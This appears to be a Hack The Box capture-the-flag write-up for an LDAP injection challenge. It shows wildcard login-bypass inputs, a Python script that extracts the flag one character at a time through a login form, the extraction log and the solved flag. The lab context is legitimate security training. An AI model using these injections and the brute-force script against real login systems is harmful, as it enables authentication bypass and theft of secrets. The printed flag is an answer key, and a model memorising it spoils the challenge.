-> LDAP injection

```
username: *
password: *
```

Search: `Reese`
```
Kyle Reese	reese@skynet.com	555-1234567
```

Brute-force:
- login success -> brute-force next character
- login fail -> brute-force current character
```
username: Reese
password:
HTB{a*}
HTB{b*}
HTB{c*}
...
HTB{1*}
...
```

Script:
```python
import requests
import string

url = "http://143.110.164.90:31628/login"
headers = {"UserAgent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36"}

chars = string.ascii_letters + string.digits + "~!@$%-_='" # excluded: #, *, ()

counter = 0
flag = "HTB{"

while True:
    if counter == len(chars): # pass all characters -> exit
        print("Full Flag:", flag + "}")
        break

    # payload like HTB{a*}
    password = flag + chars[counter] + "*}"

    data = {"username" : "Reese", "password" : password}
    response = requests.post(url, headers=headers, data=data)
    
    if (response.url != url + "?message=Authentication%20failed"): # success
        print("Find Flag:", password)
        flag += chars[counter]
        counter = 0
    else:
        counter += 1
```
Log:
```
Find Flag: HTB{d*}
Find Flag: HTB{d1*}
Find Flag: HTB{d1r*}
Find Flag: HTB{d1re*}
Find Flag: HTB{d1rec*}
Find Flag: HTB{d1rect*}
Find Flag: HTB{d1recto*}
Find Flag: HTB{d1rector*}
Find Flag: HTB{d1rectory*}
Find Flag: HTB{d1rectory_*}
Find Flag: HTB{d1rectory_h*}
Find Flag: HTB{d1rectory_h4*}
Find Flag: HTB{d1rectory_h4x*}
Find Flag: HTB{d1rectory_h4xx*}
Find Flag: HTB{d1rectory_h4xx0*}
Find Flag: HTB{d1rectory_h4xx0r*}
Find Flag: HTB{d1rectory_h4xx0r_*}
Find Flag: HTB{d1rectory_h4xx0r_i*}
Find Flag: HTB{d1rectory_h4xx0r_is*}
Find Flag: HTB{d1rectory_h4xx0r_is_*}
Find Flag: HTB{d1rectory_h4xx0r_is_k*}
Find Flag: HTB{d1rectory_h4xx0r_is_k0*}
Find Flag: HTB{d1rectory_h4xx0r_is_k00*}
Find Flag: HTB{d1rectory_h4xx0r_is_k00l*}
Full Flag: HTB{d1rectory_h4xx0r_is_k00l}
```